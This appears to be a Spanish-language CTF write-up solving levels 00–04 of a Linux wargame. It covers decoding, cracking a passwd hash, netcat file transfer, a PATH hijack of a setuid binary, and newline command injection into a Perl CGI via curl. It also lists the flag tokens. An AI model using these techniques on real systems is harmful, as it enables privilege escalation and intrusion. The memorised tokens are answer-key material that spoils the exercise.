## Level 00

Para encontrar el siguiente nivel he hecho un find / -user flag00 2>/dev/null
conel que me salen los siguientes ficheros

/usr/sbin/john

/rofs/usr/sbin/john

que al ejecutar

strings /usr/sbin/john

aparece el código cdiiddwpgswtgt

Al código hay que pasarle un rot13.-ver rot13.c- y el resultado es nottoohardhere
El Token es:
x24ti5gi3x0ol2eh4esiuxias

## Level 01

El password se encuentra en el fichero /etc/passwd

Es 42hDRfypTqqnw pero está cifrado.

El descifrado lo he hecho en la p'agina WEB https://app.onlinehashcrack.com/
Con el descifrado he obtenido la palabra --> password.
El Token es: f2av5il02puano7naaf6adaaf

## Level 02
Hay que extraer el fichero de la máquina virtual.
para extraerlo he usado:
En mi PC 
nc -l -p 1234 > level02_recibido.pcap
En la máquina virtual
nc 192.168.1.72 1234 < level02.pcap 

EL fichero que aparece en el directorio en el que estás es level02_recibido.pcap

Ejecutando 
tshark -r level02_recibido.pcap -z "follow,tcp,hex,0"

obtenemos el passowrd. 

Tambien podrñiamos habelo obtenido com 
strings -a level02.pcap | grep -A 20 "Password:"

el token flag02 es : kooda2puivaav1idi4f57q8iq

## Level 03

Para vere el código fuente tenemos

objdump -d -M intel nombre_del_programa | less

en la línea de comando 

 80484f7:       c7 04 24 e0 85 04 08    mov    DWORD PTR [esp],0x80485e0
 80484fe:       e8 ad fe ff ff          call   80483b0 <system@plt>

Se llama a la función system con el argumento que hay en el puntero 0x80485e0.

con GDB podemos extraer la cadena de texto que hay en esta dirección;

gdb -batch -ex "x/s 0x80485e0" ./level03

resutlando ser:
/usr/bin/env echo Exploit me

vemos que llama a la función echo sin el path completo usaldo la variable de entorno PATH. Si creamos una función llamada echo y en el path añadimos la nuestro folder, entoncees ejecutará primero nuestra función:
Con vim, creamos un fichero en la carpeta "/var/crash/" que se llama echo que lleve:
#!/bin/bash
/bin/getflag

Y segidamente añadimos al path;

export PATH=/var/crash:$PATH

Al ejecutar ./level03 obtenemos:

Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

## level 04

el token se obtiene directamente inyectando 
curl 'http://192.168.40.43:4747/level04.pl?x=hola%0agetflag'
hola
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

el %0a es un salto de linea que hace qeu se ejecute getflag despues de echo como si fuese una nueva instrucción.
